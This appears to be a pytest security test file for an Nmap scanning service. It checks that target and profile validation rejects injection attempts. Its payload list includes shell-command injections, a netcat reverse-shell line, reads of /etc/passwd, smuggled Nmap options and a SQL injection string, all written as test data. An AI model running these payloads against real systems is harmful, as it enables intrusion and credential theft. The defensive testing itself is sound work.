"""
tests/test_command_injection.py
===============================
Command & Argument Injection Security Tests.
Verifies that malicious payloads containing shell metacharacters or arbitrary Nmap options
cannot escape target validation, and that all subprocesses execute safely with shell=False.
"""

import pytest
from services.target_validator import validate_target
from services.nmap_service import start_scan_job, ScanAuthorizationError, ScanProfileError
from services.scan_profiles import is_valid_profile, get_profile_by_id

COMMAND_INJECTION_PAYLOADS = [
    "127.0.0.1; whoami",
    "127.0.0.1 && whoami",
    "127.0.0.1 | whoami",
    "127.0.0.1 & dir",
    "127.0.0.1 || ls",
    "127.0.0.1$(whoami)",
    "127.0.0.1`whoami`",
    "127.0.0.1;cat /etc/passwd",
    "127.0.0.1 | nc -e /bin/sh 10.0.0.1 4444",
    "127.0.0.1 > /dev/null",
    "127.0.0.1\nwhoami",
    "127.0.0.1\r\nwhoami",
    "127.0.0.1\twhoami",
    "-sS 127.0.0.1",
    "--script=vuln 127.0.0.1",
    "-oN /tmp/hack 127.0.0.1",
    "-iL /etc/passwd",
    "--interactive",
    "127.0.0.1 -p 80",
    "127.0.0.1; ping 8.8.8.8",
]

def test_target_validator_rejects_command_injection():
    """SEC-007: Target validator must flag every command injection payload as invalid."""
    for payload in COMMAND_INJECTION_PAYLOADS:
        res = validate_target(
            target=payload,
            authorized_targets=['127.0.0.1', 'localhost'],
            allow_private_subnets=True,
            allow_localhost=True
        )
        assert res['valid'] is False or res['authorized'] is False, (
            f"Payload '{payload}' was not rejected by target validator: {res}"
        )


def test_api_validate_target_rejects_malicious_input(authenticated_client):
    """Verify the /api/validate-target API endpoint rejects command injection strings."""
    for payload in COMMAND_INJECTION_PAYLOADS[:5]:
        resp = authenticated_client.post('/api/validate-target', json={'target': payload})
        assert resp.status_code == 200
        data = resp.get_json()
        assert data['valid'] is False or data['authorized'] is False, (
            f"API validate-target did not reject '{payload}': {data}"
        )


def test_start_scan_job_blocks_injection_payloads(app, auth_user):
    """SEC-007 / SEC-008: start_scan_job must refuse to execute command injection targets."""
    for payload in COMMAND_INJECTION_PAYLOADS:
        with pytest.raises(ScanAuthorizationError):
            start_scan_job(
                app=app,
                user_id=auth_user.id,
                target=payload,
                profile_id='basic_port_scan'
            )


def test_unapproved_scan_profile_rejected(app, auth_user):
    """SEC-008: Users cannot specify arbitrary or non-predefined scan profile strings."""
    invalid_profiles = [
        "arbitrary_profile",
        "-sS -sV -A",
        "custom_scan_profile",
        "'; DROP TABLE scans; --",
        "service_default_nse; whoami"
    ]
    for prof in invalid_profiles:
        assert is_valid_profile(prof) is False
        with pytest.raises(ScanProfileError):
            start_scan_job(
                app=app,
                user_id=auth_user.id,
                target='127.0.0.1',
                profile_id=prof
            )


def test_api_start_scan_rejects_injection(authenticated_client):
    """Verify that launching a scan via the API blocks injection attempts with error response."""
    resp = authenticated_client.post('/api/scans', json={
        'target': '127.0.0.1; whoami',
        'profile': 'basic_port_scan'
    })
    assert resp.status_code == 400
    data = resp.get_json()
    assert data['success'] is False
